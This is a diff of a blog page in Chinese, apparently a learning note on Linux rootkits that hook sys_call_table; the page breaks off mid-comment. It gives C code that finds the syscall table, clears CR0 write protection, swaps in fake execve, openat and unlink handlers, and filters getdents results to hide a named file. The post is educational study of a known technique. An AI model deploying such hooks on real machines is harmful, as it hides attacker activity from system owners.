@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="原理rootkit通常是指攻击者拿到root权限以后在行为这块做隐藏的恶意软件，其工作环境包括用户态和内核态，用户态的手法一般是通过ld_preload hook glibc，内核态则是写lkm去hook系统调用。hook系统调用技术其实也有细分，包括kernel inline hook、kprobe、sys_call_table hook等，这篇博客所记录的就是最基础的sys_call_tabl">
@@ -33,8 +33,8 @@
 <meta property="og:image" content="https://driverxdw.github.io/2020/08/09/rootkit-sys-call-table-hook-learning/image-20200809235428113.png">
 <meta property="og:image" content="https://driverxdw.github.io/2020/08/09/rootkit-sys-call-table-hook-learning/image-20200810001424387.png">
 <meta property="article:published_time" content="2020-08-09T14:12:08.000Z">
-<meta property="article:modified_time" content="2020-08-09T16:53:47.917Z">
-<meta property="article:author" content="xdw">
+<meta property="article:modified_time" content="2020-08-09T16:53:53.862Z">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="二进制">
 <meta property="article:tag" content="攻防">
 <meta name="twitter:card" content="summary">
@@ -148,29 +148,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -208,7 +188,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -222,7 +204,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -236,6 +217,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -268,8 +259,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2020/08/09/rootkit-sys-call-table-hook-learning/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -299,7 +290,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-08-10 00:53:47" itemprop="dateModified" datetime="2020-08-10T00:53:47+08:00">2020-08-10</time>
+        <time title="修改时间：2020-08-10 00:53:53" itemprop="dateModified" datetime="2020-08-10T00:53:53+08:00">2020-08-10</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,6 +303,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -321,7 +319,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>rootkit通常是指攻击者拿到root权限以后在行为这块做隐藏的恶意软件，其工作环境包括用户态和内核态，用户态的手法一般是通过ld_preload hook glibc，内核态则是写lkm去hook系统调用。hook系统调用技术其实也有细分，包括kernel inline hook、kprobe、sys_call_table hook等，这篇博客所记录的就是最基础的sys_call_table hook这块的内容。</p>
+        <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>rootkit通常是指攻击者拿到root权限以后在行为这块做隐藏的恶意软件，其工作环境包括用户态和内核态，用户态的手法一般是通过ld_preload hook glibc，内核态则是写lkm去hook系统调用。hook系统调用技术其实也有细分，包括kernel inline hook、kprobe、sys_call_table hook等，这篇博客所记录的就是最基础的sys_call_table hook这块的内容。</p>
 <h2 id="研究过程"><a href="#研究过程" class="headerlink" title="研究过程"></a>研究过程</h2><h3 id="sys-call-table-modify"><a href="#sys-call-table-modify" class="headerlink" title="sys_call_table modify"></a>sys_call_table modify</h3><p><strong>sys_call_table地址获取</strong></p>
 <p>sys_call_table地址获取方式有如下几种：</p>
 <p>1、从/boot/System.map中获取</p>
@@ -333,34 +331,34 @@
 
 
 <p>这边选择的是第四种方式，利用未导出函数的地址及公开的系统调用索引，从内核空间起始地址开始搜索，最终得到syscall_table</p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> **</span><br><span class="line">get_sct_via_sys_close(<span class="hljs-keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> **entry = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> **)PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)entry < ULONG_MAX; entry += <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (entry[__NR_close] == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)sys_close) {</span><br><span class="line">            <span class="hljs-keyword">return</span> entry;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> **</span><br><span class="line">get_sct_via_sys_close(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> **entry = (<span class="keyword">unsigned</span> <span class="keyword">long</span> **)PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;(<span class="keyword">unsigned</span> <span class="keyword">long</span>)entry &lt; ULONG_MAX; entry += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry[__NR_close] == (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)sys_close) &#123;</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>写保护关闭</strong></p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">void</span></span><br><span class="line">disable_wp(<span class="hljs-keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cr0;</span><br><span class="line"></span><br><span class="line">    preempt_disable();</span><br><span class="line">    cr0 = read_cr0();</span><br><span class="line">    clear_bit(X86_CR0_WP_BIT, &cr0);</span><br><span class="line">    write_cr0(cr0);</span><br><span class="line">    preempt_enable();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">disable_wp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cr0;</span><br><span class="line"></span><br><span class="line">    preempt_disable();</span><br><span class="line">    cr0 = read_cr0();</span><br><span class="line">    clear_bit(X86_CR0_WP_BIT, &amp;cr0);</span><br><span class="line">    write_cr0(cr0);</span><br><span class="line">    preempt_enable();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>sys_call_table 修改</strong></p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_openat(<span class="hljs-keyword">int</span> dirfd,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *filename, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">umode_t</span> mode)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">if</span> ((flags & O_CREAT) && <span class="hljs-built_in">strcmp</span>(filename, <span class="hljs-string">"/dev/null"</span>) != <span class="hljs-number">0</span>) {</span><br><span class="line">        fm_alert(<span class="hljs-string">"open: %s\n"</span>, filename);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_openat(dirfd,filename, flags, mode);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_unlink(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *pathname)</span><br><span class="line">{</span><br><span class="line">    fm_alert(<span class="hljs-string">"unlink: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_unlink(pathname);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_unlinkat(<span class="hljs-keyword">int</span> dfd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user * pathname, <span class="hljs-keyword">int</span> flag)</span><br><span class="line">{</span><br><span class="line">    fm_alert(<span class="hljs-string">"unlinkat: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_unlinkat(dfd, pathname, flag);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_openat(<span class="keyword">int</span> dirfd,<span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">int</span> flags, <span class="keyword">umode_t</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; O_CREAT) &amp;&amp; <span class="built_in">strcmp</span>(filename, <span class="string">"/dev/null"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        fm_alert(<span class="string">"open: %s\n"</span>, filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_openat(dirfd,filename, flags, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_unlink(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(<span class="string">"unlink: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_unlink(pathname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_unlinkat(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user * pathname, <span class="keyword">int</span> flag)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(<span class="string">"unlinkat: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_unlinkat(dfd, pathname, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> HOOK_SCT(sct, name)                    \</span></span><br><span class="line">    <span class="hljs-keyword">do</span> {                                        \</span><br><span class="line">        real_#<span class="hljs-meta">#name = (void *)sct[__NR_##name]; \</span></span><br><span class="line">        sct[__NR_#<span class="hljs-meta">#name] = (void *)fake_##name; \</span></span><br><span class="line">    } <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> HOOK_SCT(sct, name)                    \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                        \</span><br><span class="line">        real_#<span class="meta">#name = (void *)sct[__NR_##name]; \</span></span><br><span class="line">        sct[__NR_#<span class="meta">#name] = (void *)fake_##name; \</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
 <p><strong>恢复</strong></p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> UNHOOK_SCT(sct, name)                  \</span></span><br><span class="line">    sct[__NR_#<span class="hljs-meta">#name] = (void *)real_##name</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> UNHOOK_SCT(sct, name)                  \</span></span><br><span class="line">    sct[__NR_#<span class="meta">#name] = (void *)real_##name</span></span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="sys-call-hook"><a href="#sys-call-hook" class="headerlink" title="sys_call hook"></a>sys_call hook</h3><p><strong>process monitor</strong></p>
 <p>监控进程执行，其实就是hook execve后对argv进行格式化输出cmdline</p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_execve(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *filename,</span><br><span class="line">            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *<span class="hljs-keyword">const</span> __user *argv,</span><br><span class="line">            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *<span class="hljs-keyword">const</span> __user *envp)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">char</span> *args;</span><br><span class="line">    <span class="hljs-keyword">char</span> *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);<span class="hljs-comment">//1024bytes</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (buff) {</span><br><span class="line">        args = join_strings(argv, <span class="hljs-string">" "</span>, buff, PAGE_SIZE);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        args = (<span class="hljs-keyword">char</span> *)argv[<span class="hljs-number">0</span>];</span><br><span class="line">        buff = <span class="hljs-literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    printk(<span class="hljs-string">"execve: %s\n"</span>, args);</span><br><span class="line"></span><br><span class="line">    kfree(buff);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_execve(filename, argv, envp);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_execve(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *argv,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *envp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *args;</span><br><span class="line">    <span class="keyword">char</span> *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);<span class="comment">//1024bytes</span></span><br><span class="line">    <span class="keyword">if</span> (buff) &#123;</span><br><span class="line">        args = join_strings(argv, <span class="string">" "</span>, buff, PAGE_SIZE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        args = (<span class="keyword">char</span> *)argv[<span class="number">0</span>];</span><br><span class="line">        buff = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">"execve: %s\n"</span>, args);</span><br><span class="line"></span><br><span class="line">    kfree(buff);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_execve(filename, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="./image-20200809235219297.png" alt="image-20200809235219297"></p>
 <p><strong>File monitor</strong></p>
 <p>监控file（创建、删除），和execve hook类似，但ubuntu16.04 kernel 4.15.0-54 的环境中测试demo把内核hang死了，在ubuntu 18.04 kernel 4.15.0-29的环境中测试，strace发现其创建文件系统调用不是open而是openat，修改部分代码重新编译测试demo</p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_openat(<span class="hljs-keyword">int</span> dirfd,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *filename, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">umode_t</span> mode)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">if</span> ((flags & O_CREAT) && <span class="hljs-built_in">strcmp</span>(filename, <span class="hljs-string">"/dev/null"</span>) != <span class="hljs-number">0</span>) {</span><br><span class="line">        fm_alert(<span class="hljs-string">"open: %s\n"</span>, filename);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_openat(dirfd,filename, flags, mode);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_unlink(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *pathname)</span><br><span class="line">{</span><br><span class="line">    fm_alert(<span class="hljs-string">"unlink: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_unlink(pathname);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_unlinkat(<span class="hljs-keyword">int</span> dfd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user * pathname, <span class="hljs-keyword">int</span> flag)</span><br><span class="line">{</span><br><span class="line">    fm_alert(<span class="hljs-string">"unlinkat: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> real_unlinkat(dfd, pathname, flag);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_openat(<span class="keyword">int</span> dirfd,<span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">int</span> flags, <span class="keyword">umode_t</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; O_CREAT) &amp;&amp; <span class="built_in">strcmp</span>(filename, <span class="string">"/dev/null"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        fm_alert(<span class="string">"open: %s\n"</span>, filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_openat(dirfd,filename, flags, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_unlink(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(<span class="string">"unlink: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_unlink(pathname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asmlinkage <span class="keyword">long</span></span><br><span class="line">fake_unlinkat(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user * pathname, <span class="keyword">int</span> flag)</span><br><span class="line">&#123;</span><br><span class="line">    fm_alert(<span class="string">"unlinkat: %s\n"</span>, pathname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> real_unlinkat(dfd, pathname, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="./image-20200809235428113.png" alt="image-20200809235428113"></p>
 <p><strong>File hide</strong> </p>
 <p>ls等程序通过getdents/getdents64获取当前目录下的文件条目，demo hook此系统调用并过滤指定文件名条目，过滤完后返回给下层系统调用并最终输出给用户</p>
-<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="hljs-keyword">long</span></span><br><span class="line">fake_getdents(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd,</span><br><span class="line">              struct linux_dirent __user *dirent,</span><br><span class="line">              <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = real_getdents(fd, dirent, count);</span><br><span class="line"></span><br><span class="line">    print_dents(dirent, ret);</span><br><span class="line">    ret = remove_dent(SECRET_FILE, dirent, ret);</span><br><span class="line">    print_dents(dirent, ret);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> ret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// INFO: It was 